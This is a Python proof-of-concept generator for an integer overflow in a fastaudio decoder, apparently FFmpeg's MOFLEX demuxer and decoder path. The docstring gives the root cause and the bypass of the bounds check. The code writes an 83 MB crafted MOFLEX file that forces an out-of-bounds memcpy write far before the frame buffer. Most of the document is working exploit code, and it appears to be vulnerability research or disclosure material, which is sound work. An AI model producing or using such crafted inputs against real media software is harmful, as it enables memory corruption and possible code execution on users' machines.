#!/usr/bin/env python3
"""
PoC generator for VULN 001: Integer overflow in fastaudio_decode.

Root cause (fastaudio.c line 173):
    memcpy(frame->extended_data[channel] + 1024 * subframe, result, 256 * sizeof(float));

  `1024 * subframe` is a signed int32 multiplication. When subframe >= 2097152,
  the product wraps to a large negative value (UB / platform wrap), causing memcpy
  to write 1 KB starting ~2 GB BEFORE the allocated frame buffer -> OOB write.

Guard (line 116):
    if (subframes <= 0 || subframes > INT_MAX / 256)   // INT_MAX/256 = 8388607
  Only rejects subframes > 8388607, so any value in [2097152, 8388607] passes
  the check but overflows the offset on the first "overflowing" iteration.

Trigger condition (1 channel):
    pkt->size / 40 > 2097152  =>  pkt->size >= 83,886,120 bytes

Strategy:
  Build a MOFLEX file with 10241 audio blocks (no-endframe flag) accumulating
  8192 bytes each into the stream packet buffer via av_append_packet(), followed
  by one final block with endframe=1 that flushes the 83 MB packet to the decoder.

MOFLEX block layout (each block is self-contained with a sync header):
  [0x4C32 magic][2 pad][8-byte ts][2-byte size_field]  <- 14-byte sync header
  [type=2 audio desc: 8 bytes][type=0 terminator: 2 bytes]
  [1-byte flags=0]
  [bit-packed chunk header: 2 bytes (no-end) or 6 bytes (endframe)]
  [8192 bytes chunk payload]
  [1 terminator byte 0x00 to exit inner while loop]

Bit-packing for no-endframe chunk header (16 bits = 2 bytes 0x9F 0xFF):
  pop_length()=1 -> bits=1
  pop_int(1)=0   -> stream_index=0
  pop()=0        -> endframe=0
  pop_int(13)=8191 -> pkt_size=8192

Bit-packing for endframe chunk header (48 bits = 6 bytes 0xB2 0x00 0x00 0x00 0x1F 0xFF):
  pop_length()=1 -> bits=1
  pop_int(1)=0   -> stream_index=0
  pop()=1        -> endframe=1
  pop_length()=1 -> bits=1  (skip fields)
  pop_int(1)=0   -> (ignored)
  pop()=0        -> (ignored)
  pop_length()=1 -> bits=1
  pop_int(28)=0  -> (ignored, 28=1*2+26)
  pop_int(13)=8191 -> pkt_size=8192
"""

import struct
import os

OUTPUT = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'vuln_001_input.moflex')

# --- constants ---
# Audio stream descriptor: type=2, ssize=6, stream_idx=0, codec=0 (FASTAUDIO),
# sample_rate=44099 (stored as 3-byte BE, value+1=44100), channels=0 (value+1=1)
AUDIO_DESC = bytes([0x02, 0x06, 0x00, 0x00, 0x00, 0xAC, 0x23, 0x00])
TERM_DESC  = bytes([0x00, 0x00])   # type=0, ssize=0 -> end of stream descriptors
FLAGS      = bytes([0x00])         # flags=0 (even -> seek to m->pos+m->size after block)

CHUNK_DATA = bytes(8192)           # dummy audio payload (all zeros)

# 2-byte bit-packed chunk header: stream=0, no endframe, pkt_size=8192
CHUNK_HDR_NOEND = bytes([0x9F, 0xFF])

# 6-byte bit-packed chunk header: stream=0, endframe=1, pkt_size=8192
CHUNK_HDR_END   = bytes([0xB2, 0x00, 0x00, 0x00, 0x1F, 0xFF])

LOOP_TERM = bytes([0x00])          # terminates the inner while(avio_r8(pb)) loop

def make_block(ts: int, endframe: bool) -> bytes:
    """Construct one complete MOFLEX block."""
    hdr = CHUNK_HDR_END if endframe else CHUNK_HDR_NOEND
    body = AUDIO_DESC + TERM_DESC + FLAGS + hdr + CHUNK_DATA + LOOP_TERM

    # m->size = total bytes from m->pos (start of 0x4C32) to end of block
    total = 14 + len(body)
    size_field = total - 1   # stored as size_field; m->size = size_field + 1

    sync = struct.pack('>HHQ', 0x4C32, 0, ts & 0xFFFFFFFFFFFFFFFF)
    sync += struct.pack('>H', size_field)
    return sync + body

def main():
    # Need pkt->size / 40 > 2097152  =>  chunks_needed > 10240
    N_NOEND  = 10240     # non-endframe blocks
    N_CHUNKS = N_NOEND + 1   # +1 for the endframe block
    EXPECTED_PKT_SIZE = N_CHUNKS * 8192

    print(f"[*] Generating MOFLEX PoC: {N_CHUNKS} blocks")
    print(f"[*] Accumulated pkt->size will be {EXPECTED_PKT_SIZE} bytes")
    print(f"[*] subframes = {EXPECTED_PKT_SIZE} / 40 = {EXPECTED_PKT_SIZE // 40}")
    print(f"[*] Overflow threshold: subframe >= 2097152")
    print(f"[*] Output: {OUTPUT}")

    # Pre-compute a template non-endframe block (timestamp=0 for all; ts is ignored by decoder)
    noend_block = make_block(0, endframe=False)
    end_block   = make_block(N_NOEND, endframe=True)

    with open(OUTPUT, 'wb') as f:
        for i in range(N_NOEND):
            f.write(noend_block)
        f.write(end_block)

    size_mb = os.path.getsize(OUTPUT) / (1024 * 1024)
    print(f"[*] Done. File size: {size_mb:.1f} MB")

if __name__ == '__main__':
    main()
